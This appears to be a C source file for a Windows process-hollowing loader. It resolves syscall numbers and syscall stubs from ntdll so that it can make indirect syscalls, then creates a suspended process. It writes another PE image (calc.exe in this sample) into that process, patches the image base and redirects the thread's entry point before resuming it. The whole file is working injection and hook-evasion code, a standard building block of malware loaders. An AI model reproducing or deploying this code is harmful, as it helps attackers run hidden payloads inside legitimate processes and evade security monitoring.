#include "Box.h"

VOID IDSC
(
	IN HMODULE ntdll,
	IN LPCSTR NtApi,
	OUT PDWORD FuncSSN,
	OUT PUINT_PTR FuncSyscall
)
{

	if (!FuncSSN || !FuncSyscall)
		return;

	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
	if (!NtFunction)
	{
		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
		return;
	}


	*FuncSyscall = NtFunction + 0x12;
	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];

	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);

}

BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread
)
{

	BOOL State = TRUE;
	STARTUPINFOA StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;


CLEANUP:

	return State;

}

BOOL ReadTargetFile
(
	OUT LPVOID* lpBuffer,
	OUT DWORD* nNumberOfBytesToRead
)

{

	if (!lpBuffer || !nNumberOfBytesToRead)
		return FALSE;

	HANDLE hFile = NULL;
	BOOL State = TRUE;
	DWORD NumberOfBytesToRead = NULL;
	LPVOID lppBuffer = NULL;
	NTSTATUS status = NULL;
	FILE_STANDARD_INFORMATION fsi;
	IO_STATUS_BLOCK iosb = { 0 };

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
	{
		PRINT_ERROR("GetModuleHandleA");
		return FALSE;
	}
	INFO("[0x%p] Current Ntdll Handle", ntdll);

	RtlInitUnicodeString g_RtlInitUnicodeString = (RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");

	UNICODE_STRING usPath;
	g_RtlInitUnicodeString(&usPath, L"\\??\\C:\\Windows\\System32\\calc.exe");

	INFO("Current Path: %wZ", &usPath);

	OBJECT_ATTRIBUTES OA;
	InitializeObjectAttributes(
		&OA,
		&usPath,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
	);

	IDSC(ntdll, "NtCreateFile", &fn_NtCreateFileSSN, &fn_NtCreateFileSyscall);
	IDSC(ntdll, "NtQueryInformationFile", &fn_NtQueryInformationFileSSN, &fn_NtQueryInformationFileSyscall);
	IDSC(ntdll, "NtReadFile", &fn_NtReadFileSSN, &fn_NtReadFileSyscall);

	status = NtCreateFile(&hFile, GENERIC_READ | SYNCHRONIZE, &OA, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT), NULL, 0);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtCreateFile");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current File Handle", hFile);

	status = NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtQueryInformationFile");
		State = FALSE; goto CLEANUP;
	}

	SIZE_T fileSize = (SIZE_T)fsi.EndOfFile.QuadPart;
	INFO("[%ld] Current File Size", fileSize);


	if ((lppBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize)) == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Allocated Bytes to Buffer", fileSize);

	status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, lppBuffer, fileSize, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtReadFile");
		State = FALSE; goto CLEANUP;
	}

	SIZE_T bytesRead = iosb.Information;

	OKAY("[%zu] Successfully Read File!", fileSize);

	*lpBuffer = lppBuffer;
	*nNumberOfBytesToRead = (DWORD)bytesRead;

CLEANUP:

	return State;

}

BOOL GrabPeHeader
(
	OUT PIMAGE_NT_HEADERS* pImgNt,
	OUT PIMAGE_SECTION_HEADER* pImgSecHeader,
	OUT PIMAGE_DATA_DIRECTORY* pImgDataDir,
	IN LPVOID lpFile
)

{

	PBYTE pBase = (PBYTE)lpFile;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Magic Letters");
		return;
	}

	PIMAGE_NT_HEADERS pImgNt64 = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
	if (pImgNt64->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Signature");
		return;
	}

	PIMAGE_OPTIONAL_HEADER pImgOpt = &pImgNt64->OptionalHeader;

	PIMAGE_SECTION_HEADER pImgSecHead = IMAGE_FIRST_SECTION(pImgNt64);

	PIMAGE_DATA_DIRECTORY pImgDataDir64 = &pImgOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	*pImgNt = pImgNt64;
	*pImgSecHeader = pImgSecHead;
	*pImgDataDir = pImgDataDir64;

}

BOOL HollowExec
(
	IN HANDLE hProcess,
	IN PIMAGE_NT_HEADERS pImgNt,
	IN LPVOID* rBuffer,
	IN PIMAGE_SECTION_HEADER pImgSecHeader,
	IN PIMAGE_DATA_DIRECTORY pImgDataDir,
	IN LPVOID lppBuffer
)

{

	if (!hProcess || !pImgNt || !rBuffer)
		return FALSE;

	BOOL State = TRUE;
	DWORD dwOldProt = NULL, dwDelta = NULL, RelocOffset = NULL;
	DWORD dwProt = NULL;
	SIZE_T lpNumOfBytesWritten = NULL;
	NTSTATUS status = NULL;

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
	{
		PRINT_ERROR("GetModuleHandleA");
		return FALSE;
	}
	INFO("[0x%p] Current Ntdll Handle", ntdll);

	IDSC(ntdll, "NtAllocateVirtualMemory", &fn_NtAllocateVirtualMemorySSN, &fn_NtAllocateVirtualMemorySyscall);
	IDSC(ntdll, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
	IDSC(ntdll, "NtProtectVirtualMemory", &fn_NtProtectVirtualMemorySSN, &fn_NtProtectVirtualMemorySyscall);

	SIZE_T regionSize = pImgNt->OptionalHeader.SizeOfImage;
	PVOID  baseAddress = (PVOID)pImgNt->OptionalHeader.ImageBase;

	status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtAllocateVirtualMemory");
		State = FALSE; goto CLEANUP;
	}

	*rBuffer = baseAddress;

	INFO("[0x%p] Remote Base Address", baseAddress);

	dwDelta = (DWORD)baseAddress - pImgNt->OptionalHeader.ImageBase;

	printf(
		"[v] [0x%p] Source Image Base\n"
		"[v] [0x%p] Dest Image Base\n"
		"[v] [0x%p] Relocation Delta\n",
		pImgNt->OptionalHeader.ImageBase,
		baseAddress,
		dwDelta
	);

	if (baseAddress != (LPVOID)pImgNt->OptionalHeader.ImageBase)
	{
		WARN("Image Base NOT The Same!");
		State = FALSE; goto CLEANUP;
	}

	status = NtWriteVirtualMemory(hProcess, baseAddress, lppBuffer, pImgNt->OptionalHeader.SizeOfHeaders, &lpNumOfBytesWritten);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtWriteVirtualMemory");
		State = FALSE; goto CLEANUP;
	}

	INFO("Wrote Process Memory --> [0x%p] With Size --> [%d]", baseAddress, pImgNt->OptionalHeader.SizeOfHeaders);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		if (!pImgSecHeader[i].PointerToRawData)
			continue;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProt = PAGE_EXECUTE_READWRITE;
			else
				dwProt = PAGE_EXECUTE_READ;
		}
		else {
			if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProt = PAGE_READWRITE;
			else
				dwProt = PAGE_READONLY;
		}

		PVOID SecBaseAddress = (PVOID)((PBYTE)baseAddress + pImgSecHeader[i].VirtualAddress);
		PVOID SecBuffer = (PVOID)((PBYTE)lppBuffer + pImgSecHeader[i].PointerToRawData);
		SIZE_T size = pImgSecHeader[i].Misc.VirtualSize;

		if (pImgSecHeader[i].SizeOfRawData) {

			status = NtWriteVirtualMemory(hProcess, SecBaseAddress, SecBuffer, pImgSecHeader[i].SizeOfRawData, &lpNumOfBytesWritten);
			if (!NT_SUCCESS(status))
			{
				NTERROR("NtWriteVirtualMemory");
				State = FALSE; goto CLEANUP;
			}

		}

		status = NtProtectVirtualMemory(hProcess, &SecBaseAddress, &size, dwProt, &dwOldProt);
		if (!NT_SUCCESS(status))
		{
			NTERROR("NtProtectVirtualMemory");
			State = FALSE; goto CLEANUP;
		}

		OKAY("Wrote [%s] section --> at [0x%p] Base Address With Size --> [%d]", pImgSecHeader[i].Name, SecBaseAddress, pImgSecHeader[i].SizeOfRawData);


	}

CLEANUP:

	return State;

}

BOOL GetThreadCtx
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PIMAGE_NT_HEADERS pImgNt,
	IN LPVOID rBuffer
)

{

	if (!hThread || !rBuffer)
		return FALSE;

	BOOL State = TRUE;
	CONTEXT ThreadCtx;
	NTSTATUS status = NULL;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;
	ULONG suspendedCount = 0;

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
	{
		PRINT_ERROR("GetModuleHandleA");
		return FALSE;
	}
	INFO("[0x%p] Current Ntdll Handle", ntdll);

	IDSC(ntdll, "NtWriteVirtualMemory", &fn_NtWriteVirtualMemorySSN, &fn_NtWriteVirtualMemorySyscall);
	IDSC(ntdll, "NtGetContextThread", &fn_NtGetContextThreadSSN, &fn_NtGetContextThreadSyscall);
	IDSC(ntdll, "NtSetContextThread", &fn_NtSetContextThreadSSN, &fn_NtSetContextThreadSyscall);
	IDSC(ntdll, "NtResumeThread", &fn_NtResumeThreadSSN, &fn_NtResumeThreadSyscall);
	IDSC(ntdll, "NtWaitForSingleObject", &fn_NtWaitForSingleObjectSSN, &fn_NtWaitForSingleObjectSyscall);

	status = NtGetContextThread(hThread, &ThreadCtx);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtGetContextThread");
		State = FALSE; goto CLEANUP;
	}


	INFO("[CTX @ 0x%p] Current Thread Context", &ThreadCtx);

	printf(
		"_______________\n"
		"| \n"
		"| [RAX]: [0x%016llX]\n"
		"| [RBX]: [0x%016llX]\n"
		"| [RCX]: [0x%016llX]\n"
		"| [RDX]: [0x%016llX]\n"
		"| [RSP]: [0x%016llX]\n"
		"| [RSI]: [0x%016llX]\n"
		"| [RDI]: [0x%016llX]\n"
		"| [RIP]: [0x%016llX]\n"
		"| \n"
		"_______________\n",
		ThreadCtx.Rax,
		ThreadCtx.Rbx,
		ThreadCtx.Rcx,
		ThreadCtx.Rdx,
		ThreadCtx.Rsp,
		ThreadCtx.Rsi,
		ThreadCtx.Rdi,
		ThreadCtx.Rip
	);

	status = NtWriteVirtualMemory(hProcess, (PVOID)(ThreadCtx.Rdx + 0x10), &pImgNt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtWriteVirtualMemory");
		State = FALSE; goto CLEANUP;
	}

	INFO("[RCX] --> [0x%p] Updating Count Instruction...", (PVOID)ThreadCtx.Rcx);

	ThreadCtx.Rcx = (LPVOID)((PBYTE)rBuffer + pImgNt->OptionalHeader.AddressOfEntryPoint);

	/*status = NtSetContextThread(hThread, &ThreadCtx);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtSetContextThread");
		State = FALSE; goto CLEANUP;
	}*/

	if (!SetThreadContext(hThread, &ThreadCtx))
	{
		PRINT_ERROR("SetThreadContext");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[RCX] --> [0x%p] Instruction Updated... Pointing to out Allocated Buffer --> [0x%p]", (PVOID*)ThreadCtx.Rcx, rBuffer);

	status = NtResumeThread(hThread, &suspendedCount);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtResumeThread");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] waiting for thread to finish execution...", hThread);

	status = NtWaitForSingleObject(hThread, FALSE, NULL);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtWaitForSingleObject");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);

CLEANUP:

	return State;

}